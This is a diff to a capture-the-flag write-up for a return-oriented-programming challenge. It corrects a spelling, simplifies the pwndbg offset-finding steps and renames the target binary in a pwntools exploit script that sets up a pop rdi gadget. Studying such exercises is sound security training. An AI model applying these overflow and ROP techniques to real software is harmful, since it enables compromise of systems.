@@ -33,8 +33,8 @@ What we need to find:
 3. Gadgets required for the function arguments
 
 #### To find the offset needed:
-1. use `cyclic 100` in pwndbg (this generates the de bruijin sequence)
-2. `break main` and run the program (C)
+1. use `cyclic 100` in pwndbg (this generates the de bruijn sequence)
+2. `run`
 3. you should see that the `RSP` pointer contains `jaaaaaaa` and beyond. We just need the first 8 bytes because that is where the return address is.
 
 ```shell
@@ -85,8 +85,8 @@ Before we return to the `treasureChest` function, we want to prepare the registe
 from pwn import *
 
 # setup process
-p = process("./kid_ROP_bin")
-context.binary = "./kid_ROP_bin"
+p = process("./chall")
+context.binary = "./chall"
 
 # ROP gadgets
 pop_rdi = 0x4008c3 # pop rdi
